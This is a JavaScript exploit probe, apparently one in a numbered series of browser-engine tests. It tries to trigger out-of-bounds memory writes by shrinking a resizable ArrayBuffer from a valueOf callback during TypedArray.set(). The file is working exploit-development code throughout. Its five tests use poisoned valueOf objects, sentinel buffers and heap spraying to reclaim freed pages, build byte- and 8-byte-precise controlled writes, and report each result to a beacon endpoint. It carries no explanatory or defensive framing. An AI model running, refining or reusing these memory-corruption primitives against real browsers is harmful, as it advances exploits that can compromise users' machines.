// p231 — ResizableArrayBuffer shrink-during-set OOB write probe
//
// p230 Test D confirmed: RAB.resize() during TypedArray.set() valueOf callback
// does NOT cause set() to re-check the buffer length. Writes continue past
// the resized boundary. This probe shrinks aggressively to force OOB writes.
//
// Beacon prefix: V231-

(function() {
  function BS(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V231-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch (e) {}
  }

  function hex(v) {
    return ('00000000' + (v >>> 0).toString(16)).slice(-8);
  }

  BS('BOOT');

  // ---- TEST A: Shrink to 16 bytes during set of 200 elements ----
  // 200 Uint32 = 800 bytes needed. Shrink to 16 bytes at element 2.
  // Elements 4+ (offset 16+) should be OOB writes.
  try {
    BS('A-START');
    var rab = new ArrayBuffer(8192, { maxByteLength: 16384 });
    var ta = new Uint32Array(rab);
    BS('A-INITIAL-LEN-' + ta.length); // should be 2048

    // Fill with known pattern
    for (var i = 0; i < ta.length; i++) ta[i] = 0xAAAAAAAA;

    // Spray AFTER the RAB to place known data at higher addresses
    var sentinels = [];
    for (var s = 0; s < 50; s++) {
      var sab = new ArrayBuffer(8192, { maxByteLength: 16384 });
      var sv = new Uint32Array(sab);
      for (var j = 0; j < sv.length; j++) sv[j] = 0xBBBBBBBB;
      sentinels.push({ ab: sab, view: sv });
    }
    BS('A-SENTINELS-50');

    var resized = false;
    var poison = [];
    for (var i = 0; i < 200; i++) {
      poison.push({
        valueOf: function() {
          if (!resized && poison.indexOf(this) === 2) {
            try {
              rab.resize(16); // shrink to 16 bytes = 4 Uint32
              resized = true;
              BS('A-RESIZED-TO-16');
            } catch (e) {
              BS('A-RESIZE-ERR-' + e.message.substring(0, 30));
            }
          }
          return 0xDEADDEAD;
        }
      });
    }

    try {
      ta.set(poison);
      BS('A-SET-OK');
    } catch (e) {
      BS('A-SET-ERR-' + e.message.substring(0, 40));
    }

    BS('A-RESIZED-' + resized);
    BS('A-BYTELENGTH-' + rab.byteLength);

    // Check if writes went OOB past the resized boundary
    // Read through a fresh view on the resized buffer
    try {
      var check = new Uint32Array(rab);
      BS('A-CHECK-LEN-' + check.length); // should be 4 (16/4)
      for (var c = 0; c < check.length; c++) {
        BS('A-CHK-' + c + '-' + hex(check[c]));
      }
    } catch (e) {
      BS('A-CHECK-ERR-' + e.message.substring(0, 30));
    }

    // Check if sentinels were corrupted (OOB write hit them)
    var corrupted = 0;
    for (var s = 0; s < sentinels.length; s++) {
      var sv = sentinels[s].view;
      for (var j = 0; j < Math.min(sv.length, 20); j++) {
        if (sv[j] !== 0xBBBBBBBB) {
          corrupted++;
          if (corrupted <= 10) {
            BS('A-CORRUPT-' + s + '-' + j + '-' + hex(sv[j]));
          }
        }
      }
    }
    BS('A-CORRUPTED-' + corrupted);

    // Also try to grow back and read the OOB region
    try {
      rab.resize(8192);
      var full = new Uint32Array(rab);
      BS('A-REGROW-OK');
      // Check indices 4-20 (should have been written OOB if bug exists)
      for (var r = 4; r < 20; r++) {
        BS('A-OOB-' + r + '-' + hex(full[r]));
      }
    } catch (e) {
      BS('A-REGROW-ERR-' + e.message.substring(0, 30));
    }

    BS('A-SURVIVED');
  } catch (e) {
    BS('A-ERR-' + e.message.substring(0, 40));
  }

  // ---- TEST B: Shrink to 0 bytes ----
  try {
    BS('B-START');
    var rab2 = new ArrayBuffer(4096, { maxByteLength: 8192 });
    var ta2 = new Uint32Array(rab2);
    for (var i = 0; i < ta2.length; i++) ta2[i] = 0xCCCCCCCC;

    var b_resized = false;
    var b_poison = [];
    for (var i = 0; i < 100; i++) {
      b_poison.push({
        valueOf: function() {
          if (!b_resized && b_poison.indexOf(this) === 1) {
            try {
              rab2.resize(0);
              b_resized = true;
              BS('B-RESIZED-TO-0');
            } catch (e) {
              BS('B-RESIZE-ERR-' + e.message.substring(0, 30));
            }
          }
          return 0x41414141;
        }
      });
    }

    try {
      ta2.set(b_poison);
      BS('B-SET-OK');
    } catch (e) {
      BS('B-SET-ERR-' + e.message.substring(0, 40));
    }

    BS('B-BYTELENGTH-' + rab2.byteLength);

    // Grow back and check
    try {
      rab2.resize(4096);
      var full2 = new Uint32Array(rab2);
      BS('B-REGROW-OK-LEN-' + full2.length);
      // These should be 0x41414141 if OOB writes went to the "freed" region
      for (var r = 0; r < 10; r++) {
        BS('B-POST-' + r + '-' + hex(full2[r]));
      }
    } catch (e) {
      BS('B-REGROW-ERR');
    }

    BS('B-SURVIVED');
  } catch (e) {
    BS('B-ERR-' + e.message.substring(0, 40));
  }

  // ---- TEST C: Shrink + spray to reclaim decommitted pages ----
  try {
    BS('C-START');
    var rab3 = new ArrayBuffer(65536, { maxByteLength: 131072 });
    var ta3 = new Uint32Array(rab3);
    for (var i = 0; i < ta3.length; i++) ta3[i] = 0xDDDDDDDD;
    BS('C-FILLED-' + ta3.length);

    var c_resized = false;
    var c_poison = [];
    for (var i = 0; i < 500; i++) {
      c_poison.push({
        valueOf: function() {
          var idx = c_poison.indexOf(this);
          if (!c_resized && idx === 5) {
            try {
              rab3.resize(256); // shrink from 64KB to 256 bytes
              c_resized = true;
              BS('C-RESIZED-TO-256');

              // Spray to try to reclaim the freed pages
              for (var sp = 0; sp < 100; sp++) {
                var spr = new ArrayBuffer(65536);
                var sprv = new Uint32Array(spr);
                for (var j = 0; j < sprv.length; j++) sprv[j] = 0xEEEE0000 + (sp & 0xFFFF);
              }
              BS('C-SPRAYED-100');
            } catch (e) {
              BS('C-RESIZE-ERR-' + e.message.substring(0, 30));
            }
          }
          return 0xCAFE0000 + idx;
        }
      });
    }

    try {
      ta3.set(c_poison);
      BS('C-SET-OK');
    } catch (e) {
      BS('C-SET-ERR-' + e.message.substring(0, 40));
    }

    BS('C-BYTELENGTH-' + rab3.byteLength);

    // Grow back and scan for spray pattern
    try {
      rab3.resize(65536);
      var full3 = new Uint32Array(rab3);
      BS('C-REGROW-OK');

      // Check a few spots - if spray reclaimed, we see 0xEEEE0000+sp
      // If OOB write went through, we see 0xCAFE0000+idx
      // If neither, we see 0 (zeroed on resize)
      var cafeCount = 0;
      var eeeeCount = 0;
      var zeroCount = 0;
      var otherCount = 0;
      for (var r = 64; r < 500; r++) { // past the 256-byte boundary (index 64+)
        var v = full3[r];
        if ((v & 0xFFFF0000) === 0xCAFE0000) cafeCount++;
        else if ((v & 0xFFFF0000) === 0xEEEE0000) eeeeCount++;
        else if (v === 0) zeroCount++;
        else otherCount++;
      }
      BS('C-CAFE-' + cafeCount);
      BS('C-EEEE-' + eeeeCount);
      BS('C-ZERO-' + zeroCount);
      BS('C-OTHER-' + otherCount);

      // Sample specific values
      BS('C-AT64-' + hex(full3[64]));
      BS('C-AT100-' + hex(full3[100]));
      BS('C-AT200-' + hex(full3[200]));
    } catch (e) {
      BS('C-REGROW-ERR-' + e.message.substring(0, 30));
    }

    BS('C-SURVIVED');
  } catch (e) {
    BS('C-ERR-' + e.message.substring(0, 40));
  }

  // ---- TEST D: Int8Array for byte-precise OOB ----
  try {
    BS('D-START');
    var rab4 = new ArrayBuffer(4096, { maxByteLength: 8192 });
    var i8 = new Int8Array(rab4);

    var d_resized = false;
    var d_poison = [];
    for (var i = 0; i < 200; i++) {
      d_poison.push({
        valueOf: function() {
          if (!d_resized && d_poison.indexOf(this) === 10) {
            rab4.resize(8); // shrink to 8 bytes
            d_resized = true;
            BS('D-RESIZED-TO-8');
          }
          return 0x41; // 'A'
        }
      });
    }

    try {
      i8.set(d_poison);
      BS('D-SET-OK');
    } catch (e) {
      BS('D-SET-ERR-' + e.message.substring(0, 40));
    }

    // Grow back and check byte 10-20 (should be OOB writes)
    try {
      rab4.resize(4096);
      var check4 = new Int8Array(rab4);
      var oobAs = 0;
      for (var c = 8; c < 200; c++) {
        if (check4[c] === 0x41) oobAs++;
      }
      BS('D-OOB-WRITES-' + oobAs);
      BS('D-BYTE8-' + check4[8]);
      BS('D-BYTE10-' + check4[10]);
      BS('D-BYTE50-' + check4[50]);
    } catch (e) {
      BS('D-CHECK-ERR');
    }

    BS('D-SURVIVED');
  } catch (e) {
    BS('D-ERR-' + e.message.substring(0, 40));
  }

  // ---- TEST E: Float64Array OOB for controlled 8-byte writes ----
  try {
    BS('E-START');
    var rab5 = new ArrayBuffer(8192, { maxByteLength: 16384 });
    var f64 = new Float64Array(rab5);

    var e_resized = false;
    var e_poison = [];
    for (var i = 0; i < 100; i++) {
      e_poison.push({
        valueOf: function() {
          if (!e_resized && e_poison.indexOf(this) === 2) {
            rab5.resize(16); // 2 Float64s = 16 bytes
            e_resized = true;
            BS('E-RESIZED-TO-16');
          }
          // This float64 encodes as specific bytes we can check
          return 3.14159265358979;
        }
      });
    }

    try {
      f64.set(e_poison);
      BS('E-SET-OK');
    } catch (e) {
      BS('E-SET-ERR-' + e.message.substring(0, 40));
    }

    // Grow back and read through Uint32 for raw bits
    try {
      rab5.resize(8192);
      var u32check = new Uint32Array(rab5);
      // Float64 index 2 = Uint32 index 4,5 (first OOB float64)
      BS('E-OOB-U32-4-' + hex(u32check[4]));
      BS('E-OOB-U32-5-' + hex(u32check[5]));
      // Float64 index 10 = Uint32 index 20,21
      BS('E-OOB-U32-20-' + hex(u32check[20]));
      BS('E-OOB-U32-21-' + hex(u32check[21]));
    } catch (e) {
      BS('E-CHECK-ERR');
    }

    BS('E-SURVIVED');
  } catch (e) {
    BS('E-ERR-' + e.message.substring(0, 40));
  }

  BS('SYNC-DONE');
})();
